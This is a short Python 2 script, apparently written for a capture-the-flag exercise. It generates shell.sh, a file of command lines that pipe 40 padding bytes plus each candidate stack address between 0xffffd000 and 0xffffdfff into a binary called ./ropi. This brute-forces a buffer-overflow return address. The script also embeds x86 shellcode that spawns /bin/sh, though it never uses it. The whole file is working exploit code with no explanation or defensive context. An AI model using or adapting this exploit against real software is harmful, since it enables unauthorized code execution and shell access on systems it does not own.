
import sys
def to_address(s):
    if len(s)%2 !=0:
        s = "0"+s
    x = [s[i:i+2] for i in range(0,len(s),2)]
    x.reverse()
    return  "\\x"+"\\x".join(x)
def to_shell(x):
	ssh="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

	x = hex(int(x)).replace("L","")
	return 'python -c '+"'"+"print "+' "' +"A"*40+'' +to_address(x[2:]).strip()+'"'+"'"+" | ./ropi"

def main():
    f = open("shell.sh","w")
    for i in range(0xffffd000,0xffffdfff):
         f.write(to_shell(i)+"\n")
    f.close()
if __name__ == "__main__":
    main()
